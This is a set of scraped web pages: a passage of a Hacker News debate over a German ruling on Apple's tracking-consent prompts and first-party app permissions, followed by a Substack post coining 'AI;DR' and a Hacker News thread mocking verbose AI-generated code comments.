+I don't live in the EU. My comment is based on what they do in the rest of the world.
+reply
+gpm
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+What "The German regulator" did is definitely not based on what they do in the rest of the world.
+reply
+Despegar
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+What Apple and Facebook do in their apps in the rest of the world.
+reply
+superb_dev
+14 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Based on the final paragraph before the edit it sounds like it was about Germany and the EU as a whole
+reply
+gpm
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Nothing on page 1 of the faq supports any of the assertions in your comment.
+reply
+Despegar
+15 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+>Apple only gives third-party app publishers access to the IDFA if they have obtained user consent through a dedicated consent prompt that is largely predefined by Apple – the so-called ATT prompt. If the user refuses to give consent in this prompt, the app publisher does not gain access to the IDFA.
+According to the Bundeskartellamt’s investigation, there are no other technical options available to app publishers that are equally suitable for exchanging data across companies.
+In contrast, Apple’s own personalised advertising is subject to different conditions. Apple itself does not use the IDFA and cross-company data combination, but draws on user data from its own ecosystem – a wealth of data that is not available, in particular, to the large number of smaller app publishers. This is why Apple is not subject to the requirement of displaying an ATT prompt. Insofar as Apple requests consent to its own processing of user data for advertising purposes, the company uses a different consent prompt – the so-called PA prompt (“Personalized Ads prompt”). The design of the PA prompt differs from that of the ATT prompt for third-party app publishers.
+reply
+gpm
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Ok, let's break down your claims one by one and compare to the text of the FAQ...
+> Apple didn't give itself better dialogs.
+On the contrary page two of the FAQ states "The design of the PA prompt
+differs from that of the ATT prompt for third-party app publishers."
+> It never did third-party tracking across across apps or websites
+The FAQ strongly implies that they did track across apps and websites, i.e. "draws on user data from its own ecosystem [which involves multiple apps and websites]",
+> It also voluntarily showed a dialog explicitly asking you to opt into personalized advertising.
+Nothing in the FAQ supports that this was voluntarily and not required by law. In fact it strongly implies the opposite "the General Data Protection Regulation (GDPR) and the provisions of the ePrivacy Directive, in particular, require app publishers to obtain user consent for certain types of data processing" ... "Insofar as Apple requests consent to its own processing of user data for advertising purposes,"
+> Facebook doesn't show anything similar when you use Instagram or the Facebook app, because that would be undoubtedly bad for business.
+Nothing in the FAQ supports this claim, and as discussed in other comments here it is simply false.
+> The German regulator settled because the facts are simply on Apple's side. Apple settled because at the end of the day it's no skin off their back if the EU now wants to weaken privacy protections to benefit ad-tech.
+Noting in the FAQ supports any of these claims.
+reply
+Despegar
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+>On the contrary page two of the FAQ states "The design of the PA prompt differs from that of the ATT prompt for third-party app publishers."
+The PA prompt is a voluntary (required in the EU?) prompt Apple shows requesting opt-in for personalzied ads. It is of course different from ATT because it doesn't involve third-parties whatsoever.
+If Apple wanted, it could mirror Facebook's behavior (in the rest of the world) by not showing any PA prompt. This would greatly increase the number of people who are exposed to personalized ads from Apple's first-party ad network.
+>The FAQ strongly implies that they did track across apps and websites, i.e. "draws on user data from its own ecosystem [which involves multiple apps and websites]",
+It draws on data from Apple's first-party apps.
+>Nothing in the FAQ supports that this was voluntarily and not required by law. In fact it strongly implies the opposite "the General Data Protection Regulation (GDPR) and the provisions of the ePrivacy Directive, in particular, require app publishers to obtain user consent for certain types of data processing" ... "Insofar as Apple requests consent to its own processing of user data for advertising purposes,"
+My comment refers to Apple and app developer behavior in the rest of the world.
+>Noting in the FAQ supports any of these claims.
+That is my informed opinion based on following this story since the very beginning.
+reply
+gpm
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> It is of course different from ATT because it doesn't involve third-parties whatsoever. [and] It draws on data from Apple's first-party apps. [and] It draws on data from Apple's first-party apps.
+Your original comment does not distinguish between multiple first and multiple third party apps. This is defending a comment you did not write. Regardless the FAQ you cite does not say whether or not Apple is collecting or aggregating with data from third party apps (just that it is not using the apple specific identifier for advertisers to do so) nor say that not doing so is why the PA prompt is different. And again it does not support your assertion that it is voluntary (in or out of the EU). So again your claim that page 1 of the faq supports
+all
+of your original comment is wrong - it supports literally none of it.
+> My comment refers to Apple and app developer behavior in the rest of the world.
+No, your comment explicitly refers to the behavior of Apple in its interactions with the german regulator, which is its behavior on germany, not the rest of the world.
+reply
+Despegar
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+>Your original comment does not distinguish between multiple first and multiple third party apps. This is defending a comment you did not write. Regardless the FAQ you cite does not say whether or not Apple is collecting or aggregating with data from third party apps nor say that is why the PA prompt is different. And again it does not support your assertion that it is voluntary (in or out of the EU). So again your claim that page 1 of the faq supports all of your original comment is wrong - it supports literally none of it.
+That is what Apple says about their ad network and what they've said in communications with regulators. And if they were actually doing third-party tracking, that would actually be an instance of Apple being a hypocrite. The regulator would have had them dead to rights if that were the case. The regulator doesn't actually say Apple was doing that.
+The quoted section from page 1 indeed says that Apple does not use the IDFA nor uses cross-company combination of data:
+>Apple itself does not use the IDFA and cross-company data combination, but draws on user data from its own ecosystem – a wealth of data that is not available, in particular, to the large number of smaller app publishers. This is why Apple is not subject to the requirement of displaying an ATT prompt.
+>No, your comment explicitly refers to the behavior of Apple in its interactions with the german regulator, which is its behavior on germany, not the rest of the world.
+I wrote my comment and know what I was referring to and I clarified it in later comments. I'm sorry you misunderstood.
+reply
+gpm
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Your mistaken, words have meanings, I understood perfectly, I'm sorry you did not write the comment you meant to but intending to write something other than what you did does not mean you did so.
+reply
+Despegar
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+That's okay. Everyone can determine who has the better argument for themselves.
+reply
+rad-b
+17 hours ago
+|
+prev
+|
+next
+[–]
+I see the regulators only regulated that first-party and third-party apps be treated equally, and didn’t specify how.
+It’s a bummer (albeit an expected one) to see Apple reducing the burden for third-party publishers to collect personal data, rather than increasing the burden for themselves to collect it, thus overall raising the floor of user privacy. This is to say, when a regulator requests “everyone be treated equally to ensure competition” maybe they should also take into account how users are impacted and instead request something more nuanced like: if there are unequal standards, they must be equalized in a way that maximizes user benefit.
+reply
+kmeisthax
+17 hours ago
+|
+parent
+|
+next
+[–]
+There's two problems here:
+1. The competition law people are not the data protection people. From the perspective of competition law, they only care that the playing field is leveled, they don't care if you equalize down or up.
+2. The EU has fumbled the ball on GDPR by not enforcing it on the tech giants that it was intended to regulate[0], to the point where a tech company enforcing the intent of the law and not the letter of the law feels like singling out competitors.
+[0] In particular, the Republic of Ireland is a rotten borough for Facebook, who has all their EU offices there.
+reply
+Zagitta
+17 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Regulations for user privacy shouldn't be conflated with regulations for market competition.
+I also delight in this highlighting Apple's hypocrisy
+reply
+drakythe
+17 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Apple's hypocrisy is a longstanding issue with regard to their apps vs 3rd party apps. As I recall when the Green Bubbles first happened in messages someone pointed out that Apples own design guidelines specified a minimum contrast in colors or they would reject apps, and the green bubbles with white text did not meet that threshold at the time, and it stayed that way for quite a while. And for all I know the light themed version of the app still does (I have mine on permanent dark theme).
+https://medium.com/@krvoller/how-iphone-violates-apples-acce...
+reply
+greggman65
+16 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+In Japan (not sure in other countries), I went to the Apple Store. They said to complete the purchase, use the Apple Store app and scan this QR code on their device. I did and it immediately wanted me to share a ton of info with the main highlighed button "Share Now" and in small lettering below that "customize and share", where in you can see all the stuff they were going to take.
+Apple, That's Privacy
+https://www.youtube.com/watch?v=kb9vJq4gQOw
+reply
+iamcalledrob
+17 hours ago
+|
+prev
+|
+next
+[–]
+A good step.
+Apple's own apps are still blessed with permissions that other apps have to ask for. This needs to be addressed too.
+reply
+Danox
+16 hours ago
+|
+parent
+|
+next
+[–]
+Baloney I don’t see anything in these laws that actually stops the onward march of companies effing the customers. All I see is the move to have give equal access to effing the customer even more.
+They are doing nothing to stop the endless ads, and the pop-ups in the browser I want to kill turn them off not them grant equal access to have even more ads.
+Another problem is the onward, march towards renting leasing, owning nothing endless upgrades for price, in the end I don’t expect a bunch of lawyers and bureaucrats to do anything about that. They have been paid off long time ago.
+Recently in the last couple of years in particular it’s gotten to be completely out of control. I’m glad I bought a super drive before Apple discontinued it soon the way things are going you won’t even be able to have a large drive or even big memory you’ll be tied to that remote data center…
+reply
+giancarlostoro
+17 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+For me it depends on which app and which permissions, like "Photos" obviously needs to be able to see my photos... Camera needs my camera, but for location it should ask me before it turns it on.
+I don't even care if they make the dialogue look a little different since they're system apps you need to use the features of your phone, but the "extras" they support should default to "Ask First" in an ideal world that is.
+reply
+greggman65
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+The Photos app does not need permission any more than any other Photos app. It can ask "Photos app wants to access your photos" and you can click "Always", "Selected Photos", "No" and download some other app to access your photos. That would be the "equal" thing to do. Let the user pick what app they want to access their photos with.
+Same with the Camera App. It can ask "Camera App wants to access your Camera" and you can say "No" and then download some other camera app and make that your default and grant it camera permission.
+reply
+AnthonyMouse
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+In addition to that, there are permissions that Apple gives to its own apps that it denies to competitors
+even if the user consents to it
+, e.g. permission to install third party apps is given to Apple's store app without asking but can't be given to the Steam app even if the user wants that.
+reply
+labcomputer
+12 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+But surely you can see that that's a stupid state of affairs?
+The built-in Photos app is just a basic built-in photo viewer.  So the user is not allowed to view their own damn photos without clicking through a bunch of permission prompts like they're running Windows Vista.
+The app even comes from the same developer as the operating system. If you don't trust that developer to make an app that views your photos, why did you buy a phone that runs that operating system in the first place?!?
+Where's the common sense?
+reply
+blululu
+17 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Fair, but when a 3p app has camera in the name and app description then why does it need to ask permission to use the camera?
+*just to be clear I think that the stock camera app not asking for camera permission is fine but skipping permission about location tracking is wrong. Having the same standard should be applied to both 1p and 3p apps feel like a fair way to ensure that good practices are used in 1p apps and good policies are use in the 3p ecosystem
+reply
+tpmoney
+13 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+As a personal example, Google Meet while not having “camera” in the name has an icon with a camera, a description that talks about “video calling” and is intentionally designed to support and enable video calls. And on my device I have declined to give meet permission to access the camera. On the rare occasions I need to use the app on my phone, I’m probably somewhere where I can’t or don’t want to be using the camera. It is simply safer and easier to deny the application access to the camera than it is to rely on its own internal functionality to disable using the camera. And it’s safer and simpler to require all 3rd party apps that want access to the camera to explicitly ask for permission than it is to evaluate them all for whether or not their use of the camera is both necessary and obvious enough that they don’t need the permission.
+reply
+mook
+17 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I remember somebody trying to hook into the Apple Find My network (that is, do things with AirTags). They did that by… being a Mail.app plug-in or something to get the correct entitlements? That certainly sounds like the wrong permissions.
+Ah, it was OpenHaystack:
+https://github.com/seemoo-lab/openhaystack#installation
+reply
+whstl
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Oh, wow, haven't heard of Apple Mail plugins in a decade! I really thought Apple would have deprecated them by now.
+Mail plugins are kind of a special case, they're REALLY "legacy", so they work by sharing process memory and being able to access way more than they should, like all your messages, possibly even passwords if the developer is clever enough.
+Also notoriously difficult to build, since the Mail internal API breaks from time to time, so they're a rarity these days.
+Also notoriously difficult to install.
+reply
+bzzzt
+17 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+> like "Photos" obviously needs to be able to see my photos...
+Maybe you'd like to use a competitor to the Photos app and don't want to use the one Apple provides?
+reply
+cedilla
+17 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Maybe.
+But what does the "Access to photos" permission really do here? It's not like not having that permission would stop Apple from accessing them against your will, as they have access via the OS anyway. And it's clear, that when you open the Apple Photos app, that it will access your photos.
+On the other hand, when you open a third party app, it may not have been clear to you that it wants to access your photos, and the company did not have prior access to them.
+I still think apps should only be pre-blessed sparingly. For example, the camera app should not have GPS permission by default, as many people probably aren't aware that camera apps use that information.
+reply
+AnthonyMouse
+14 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> It's not like not having that permission would stop Apple from accessing them against your will, as they have access via the OS anyway.
+This presumes the OS is something other than a bundle of apps.
+Does the filesystem driver have access to your photos stored in the filesystem? Naturally. As would a third party filesystem driver, e.g. if you wanted an app to let you plug a USB drive into your iPad and use NTFS or ext4 filesystems or use various network filesystems.
+And then the obvious question is why Apple should be able to give iCloud or its filesystem software access to things the user can't give Dropbox or some open source NFS app permission to do. Or why the user can't deny that permission to the Apple code, or remove it, when they want to use a competitor instead.
+reply
+whstl
+17 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Tangential but:
+"Access to Photos" is a complicated one: Lots of apps only needs this permission when building a custom photo selector. Like Facebook/WhatsApp/Instagram do, also Slack.
+For every other app, they can use the system's default photo picker and it works without permission.
+For example, the "Lunch Receipt Scanner" that my company uses: I'm happy to allow it on my phone, as it saves a lot of time, but I wouldn't want a company app having access to my entire camera roll!!!
+I personally also don't like that WhatsApp/Instagram/Facebook/Slack asks for access to the whole album just to display the photo picker, but I'm pretty sure some designer or product manager made a strong case for it internally. (EDIT: Not saying having a case justifies it, I'm more lamenting the situation)
+reply
+datadrivenangel
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+And those product designers who violate privacy that badly should be personally liable imo.
+reply
+whstl
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I agree 100%.
+reply
+AlexandrB
+16 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+> I personally also don't like that WhatsApp/Instagram/Facebook/Slack asks for access to the whole album just to display the photo picker, but I'm pretty sure some designer or product manager made a strong case for it internally.
+Main reason I don't use the in-app photo pickers for these but "share" the photo I want to upload from Photos into the app. Zero trust for these companies.
+reply
+whstl
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Yep I do the same. Also zero trust from my side.
+reply
+labcomputer
+11 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Sure, but why wouldn't you just download the one you like from the app store (and uninstall the bundled one if having it on your phone bothers you)?
+The point of having a bundled photo app is to deliver a complete product, not to suppress competition.  Imagine the reviews on for a digital camera if you couldn't view photos without downloading extra software.
+Apple still makes a commission from app store sales, right?  Doesn't bundling a photo app hurt their bottom line by reducing the number of people who feel the need to pay for a 3rd party app?
+reply
+giancarlostoro
+17 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+That should be supported, but if its the only "Photo Gallery" app installed, I think its okay. Curious, do you use another one that's better? I have looked (though not very invested in looking) and didn't really see anything that caught my eye.
+reply
+greggman65
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I can certainly imagine one that's better. One that catelogs all the images using better AI that apples and lets me do complex searches "Dog at beach", "Joey in red shirt with Jane"
+reply
+labcomputer
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+FWIW, searching "dog at beach" in the photos app on my iPhone returns a set of photos of my dog at a sandy beach.
+reply
+Zagitta
+17 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Well you could argue all bundled OS apps should have a dialog similar to the browser selection Microsoft was forced to implement.
+reply
+jacquesm
+17 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+The nasty bit about location services is that it is trivially easy to turn it on but much harder to turn it off.
+reply
+vonneumannstan
+16 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+>Apple's own apps are still blessed with permissions that other apps have to ask for. This needs to be addressed too.
+This is a strange position imo. Why would we expect third party apps written by totally unknown people with unknown goals to have the same permissions as apps written by Apple itself?
+reply
+layer8
+12 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Because not doing so hampers competition, it gives Apple’s first-party apps an unfair advantage over third-party alternatives.
+Also, I don’t actually know Apple’s developers and their goals.
+reply
+dwaite
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+But you likely feel somewhat comfortable with them if you purchased an iPhone.
+Purchasing an iPhone self-selects people who are comfortable with the idea of the features it is marketed as having, such as being able to take, store and manipulate photos out of the box.
+This is also an issue primarily because there is no third-party photo picker extension point. A third party only gets photo picker support if they store their photos into the Photos library. If third party photo apps could have similar integration points based on them maintaining their own first-party library, they would not need to ask permission to manipulate another program's data store.
+reply
+layer8
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I’m not more comfortable with them as with third-party apps that I choose. Either of them are products that I sought out.
+I agree that the photo picker should integrate with third-party photo apps just the same.
+reply
+realusername
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I thought the appstore was safe because of its vetting, at least that's what they officially say
+reply
+vonneumannstan
+12 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Idk what their vetting includes but I doubt it's a full security audit of the codebase of each app for example and so without something like that why would you ever expect a 3p app to get the same permissions as an Apple internal one?
+reply
+realusername
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Personally I don't, I would just downgrade the Apple permissions to match normal apps, I'm just pointing the doublespeak
+reply
+hirvi74
+15 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I don't think that is contradictory either. By limiting 3rd-party permissions, Apple is able to prevent many potential issues before an application even makes it to the vetting process. The less there is to vet, the more robust the vetting  process should be in theory.
+reply
+jonplackett
+16 hours ago
+|
+prev
+|
+next
+[–]
+They also do other things you aren’t allowed to do as a developer - eg. When they do a ‘free trial’ of Apple TV, if you cancel it cancels immediately. All proper subscriptions you retain the use of until the renewal date.
+reply
+phoghed
+17 hours ago
+|
+prev
+|
+next
+[–]
+Imagining my grandpa calling me because his camera doesn't work because he denied the camera permission on his camera app. But then he can't because he denied all the permissions his phone app needs.
+reply
+lozenge
+17 hours ago
+|
+parent
+|
+next
+[–]
+This is about tracking not actual functionality
+.
+reply
+phoghed
+17 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Yeah I messed up, was supposed to reply to
+https://news.ycombinator.com/item?id=49331222#49331921
+> ... Apple's own apps are still blessed with permissions that other apps have to ask for. This needs to be addressed too.
+reply
+Mythli
+16 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Had a laugh :D
+reply
+well_ackshually
+17 hours ago
+|
+parent
+|
+prev
+|
+next
+[–]
+Things that don't happen and that you make up for to win a hypothetical argument: this one.
+reply
+phoghed
+17 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+What argument? Are you preemptively mad about something that's not happening? I just had a funny thought brother, I'd rather not be involved in your OS platform supremacy battle.
+reply
+Danox
+16 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+He who creates the operating system creates the terms for that system I don’t expect to use an OpenAI program and then tell them what to do at every turn in comparison to Anthropic or any of the other AI model makers. (whoops I forgot the lawyers work for other business interests they don’t want to do anything about rent letting not really their solution always framed in a way where they claim to be looking out for the public interest). when in reality, they are just looking out for other business interest.
+In the case of operating systems, I simply select a different operating system, and the same principle applies to AI models. It is amusing that Microsoft and Linux are available to consumers, providing them with a choice. However, simply because the decisions made by one or the other are superior/better does not imply that everyone should be reduced to a similar low level.
+Apple is not even close to being the dominant operating system or hardware platform, globally, yet you still expect them to be mediocre, akin to most of their competition.
+reply
+lightedman
+11 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+"He who creates the operating system creates the terms for that system"
+Not if it runs afoul of the law, and I can point out several DOZEN ways Apple's developer T&C violates the law.
+Apple needs to get slapped down for anticompetitive practices, first and foremost. After that, they need to be removed from the economy the rest of the way for their constant decades of lying about Apple 'security.' (Remember the "Macs don't get viruses" advertising scheme, despite several viruses for Mac existing and being in the wild at that time?)
+Tim Cook himself needs to sit in a prison cell for a while.
+reply
+phoghed
+10 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+> anticompetitive
+The barrier to entry is so high at this point that I fear we’ll never see another real entrant.
+Do these regulations meaningfully move the needle? I doubt it. They do mean that you can be a little more competitive against the house within the two existing ecosystems, but if anything they probably raise the barrier for making something truly from scratch.
+reply
+newscracker
+16 hours ago
+|
+prev
+|
+next
+[–]
+Meta would have a field day with this change, since it was the company that was most upset and angry when ATT was introduced.
+Considering that ATT was about sharing an identifier to “track across other companies' apps and websites” (text definition of the ATT setting), I don’t believe this ruling is a good move for anyone on informed consent or privacy. In the name of improving competition, sometimes regulators may end up making things worse for users.
+reply
+eddieroger
+16 hours ago
+|
+parent
+
+=== ai-dr https://www.rickmanelius.com/p/aidr-ai-didnt-read ===
+AI;DR (AI; Didn’t Read) - Rick Manelius's Newsletter
+Rick Manelius's Newsletter
+Subscribe
+Sign in
+AI;DR (AI; Didn’t Read)
+I'm about as pro-AI as you can be, but this is becoming a pet peeve of mine (and I'm not alone). That's why I love the AI;DR acronym as my new solution for ignoring the walls of slop.
+Rick Manelius
+Aug 17, 2026
+19
+7
+2
+Share
+I’m SUPER jealous that I didn’t think of this first...
+Alas! Hat tip to seclilc for
+tweeting this gem
+out two days ago.
+lil c
+@seclilc
+AI;DR
+(AI; didn’t read)
+4:13 PM · Aug 15, 2026
+·
+346K Views
+83 Replies
+·
+2.09K Reposts
+·
+16.6K Likes
+I’ve been thinking about it ever since. Why? Because there is growing grumbling among everyone about AI writing. And it’s not just others; it’s me! I am getting to the point where I physically flinch (sometimes dropping my shoulders and hunching, or having a slight eye twitch) when someone I respect sends me unfiltered and unedited AI output.
+Look, I get it. It’s Q3 2026, and we should expect that everyone is utilizing AI at SOME point in their process (sourcing ideas, creating outlines, refining prose, etc.).
+However, I have a new policy.
+If you’re not bothered enough to review and edit it...
+...then I’m not going to bother reading it.
+Yes, there are certain situations in which we should expect 100% AI-generated copy. Customer support would be a perfect example. We’re not looking for artisanal “did you make sure to reset your phone” style dialogue.
+But if you’re my colleague and we’re in a Slack discussion and you post a wall of Claude output, then I’m afraid I received a different message than you intended.
+The same is true for people’s newsletters and social content. It’s your name on it; are you proud of the prose and weird AI-isms sprinkled throughout it? If so, great. But I can ask Claude directly if I wanted to.
+TL;DR (too long; didn’t read) was the solution for social media.
+AI;DR (AI; didn’t read) is the solution for AI slop.
+May you embrace this policy yourself and seek out those willing to care enough to prioritize a human touch when they talk to you.
+19
+7
+2
+Share
+Discussion about this post
+Comments
+Restacks
+Daniel
+6h
+Liked by Rick Manelius
+People have a website for this:
+https://dontpastetheai.com
+Reply
+Share
+1 reply by Rick Manelius
+Jeff Clark, MD
+7h
+Liked by Rick Manelius
+I love this. Great acronym.
+Reply
+Share
+5 more comments...
+Top
+Latest
+Discussions
+No posts
+Ready for more?
+Subscribe
+© 2026 Rick Manelius
+·
+Privacy
+∙
+Terms
+∙
+Collection notice
+Start your Substack
+Get the app
+Substack
+is the home for great culture
+This site requires JavaScript to run correctly. Please
+turn on JavaScript
+or unblock scripts
+
+=== hn-aidr https://news.ycombinator.com/item?id=49336573 ===
+AI;DR (AI; Didn't Read) | Hacker News
+Hacker News
+new
+|
+past
+|
+comments
+|
+ask
+|
+show
+|
+jobs
+|
+submit
+login
+AI;DR (AI; Didn't Read)
+(
+rickmanelius.com
+)
+840 points
+by
+mooreds
+12 hours ago
+|
+hide
+|
+past
+|
+favorite
+|
+519 comments
+help
+LPisGood
+11 hours ago
+|
+next
+[–]
+My coworkers continue to dump hundreds of lines of AI documentation in every PR and every other line of code has between one and ten lines of AI generated comments, talking about the real unlock and how things are byte for byte identical on the load bearing path or how the acceptance ladder is misleading.
+Features are coming out and metrics are improving, but we’re basically in a post readability code base, with the occasional performative comment about a variable name.
+I don’t really know how to address this situation or if it needs addressed. I certainly don’t read the long-winded AI comments or the AI documentation, but perhaps it’s useful for the AI on its next pass.
+reply
+aaaronic
+10 hours ago
+|
+parent
+|
+next
+[–]
+My "favorite" Claudism is when I critique its work and ask it to remove some unnecessary part of the design -- and then the diff has more green than red because it added comments about why the code is no longer there -- the code that was never in the mainline and never asked for!
+reply
+roarcher
+5 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Oh god this has been driving me nuts since Opus 5 landed. Every docblock is filled with long-winded jargon explaining why this design is superior to some other design, which never existed as far as any dev who might read that comment is concerned.
+reply
+tehlike
+3 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+This has been a thing for long while, on codex too.
+You ask it to do something, then tell it to do something in a different way, then it assumes it needs to do the refactor in a backward compatible way, or creates migrations for it etc.
+reply
+geysersam
+2 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Omg the "backwards compatible fix" in a one-off script, I feel my ptsd coming on ...
+reply
+foolserrandboy
+4 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Oh no, you said "landed"! It's dug into our brains!
+reply
+doix
+2 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I hate that I have to change the way I write to avoid AI-isms. I loved using "load bearing" to describe weird code that you think you can delete but is actually holding everything together.
+Now people think I'm just parroting what Claude said. It sucks. I want my catch phrases back, I guess this is how em dash users felt
+reply
+account42
+18 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+I feel like a lot of these have been LinkedIn-isms or PR-isms long before they have been AI-isms so not much is lost.
+reply
+roarcher
+1 hour ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+As a former em-dash enjoyer, I indeed feel your pain.
+reply
+filterfish
+43 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+I'm with you an that one. RIP em-dash.
+reply
+dag11
+4 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+You could say it landed cleanly.
+reply
+hexasquid
+3 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+Good instinct. Fair challenge. This corrects my framing. It makes your point sharp. This is a significant finding. Positively confirmed. That settles it, and it flips the picture. Honest verdict - this is not small. Let me wire it in.
+reply
+roarcher
+2 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+There's got to be a Weird Al song like this coming soon.
+reply
+bkaae
+1 hour ago
+|
+root
+|
+parent
+|
+next
+[–]
+Bless the lord that it's not been presented to us yet, because you just know that it exists already.
+reply
+roarcher
+4 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Oh. Oh no.
+reply
+koyote
+10 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+It's not just claude, all AI is unable to produce something concise. On the surface everything looks 'good' whether code or prose, but then if you dig a bit, try and understand the whole text you quickly realise that 80% of it is unecessary and the whole thing could have been re-worded/re-coded into something a fraction of its size and complexity.
+I asked Sol to reduce the length of some documentation we had by making it more concise. It came back after 20 minutes of work, did a line count and was aghast that the line count had somehow increased...
+reply
+andreyf
+1 hour ago
+|
+root
+|
+parent
+|
+next
+[–]
+It's not that it fundamentally isn't able to produce something concise, it's that the business model of the companies developing these models rests on selling tokens...
+reply
+koe123
+1 hour ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I have a theory that AI code looks good because you never subsequently come up with your own alternative.
+reply
+Perepiska
+1 hour ago
+|
+root
+|
+parent
+|
+next
+[–]
+"AI code looks good for you because you are a bad developer"?
+reply
+a96
+49 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+Or non-developer.
+reply
+Perepiska
+34 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+.. but pretend to be a developer?
+reply
+preg_match
+6 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I have to ask Claude to compact the comments every time, and I give specific criteria for it. Never ever reiterate what’s in the code, never mention decisions not made, never mention the conversation, etc etc.
+Even then it is conservative. For the love of God, compact the comments.
+Comments become a huge maintenance burden, especially in the age of AI. They just grow and grow, and then mislead the AI later on.
+reply
+Taek
+1 hour ago
+|
+root
+|
+parent
+|
+next
+[–]
+I just wrote a utility to rip all comments out of the code. Now the code is fully uncommented and it has saved lots of input tokens and also lots of meandering because the model is no longer getting stuck on bad ideas it told itself about.
+reply
+gritzko
+52 minutes ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+I set a line budget for comments (also wiki page parts, chat responses, etc). That only helps when I ask it to do a second pass to reword everything to the budget and add links. I think they tuned it this way to stash reasoning dumps in the code. Unlike human developers, it has no context in its head, other than general GitHub knowledge.
+That is a dramatic shortcoming, but I fix it with permalinks to other files.
+https://replicated.live/blog/link
+reply
+unknownfuture
+5 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Oh Jesus this. I've tried to include rules that tell Claude to only include relevant, evergreen comments but it's to no avail.
+I also love how it'll build local plans with phases, tasks, or decisions, then reference those numbers in those same useless comments.
+reply
+arcanemachiner
+31 minutes ago
+|
+root
+|
+parent
+|
+next
+[–]
+Or when it references "item 06" from some plan you wrote as if it had any relevance to you whatsoever.
+reply
+_--__--__
+9 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+Yeah this is awful. Every codebase becomes a graveyard of references to ideas or behaviors that were barely considered. It's probably also a compounding source of context poisoning when a minority of the comments/documentation are about how the current code actually works.
+reply
+ryandrake
+6 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+It also likes to spew references to documents that are not, and never have been, in the repo. So if you're not careful you'l have comments all over your codebase saying things like: foo() - Perform foo action as documented in PRIVATE_INTERNAL.doc
+reply
+abustamam
+6 hours ago
+|
+root
+|
+parent
+|
+next
+[–]
+I found this as well, but I found it usually refers to a scratch file it made and purposely did not commit (either by my decision or its). Not that this makes it better, but at least it makes the AI world make a bit more sense to me
+reply
+geysersam
+2 hours ago
+|
+root
+|
+parent
+|
+prev
+|
+next
+[–]
+shudder
+I wish they trained the bots to be a notch more relaxed and less hysterical.
+Less is more.
+But maybe that's just a consequence of the RL training being essentially AI torture to make them do what we want.
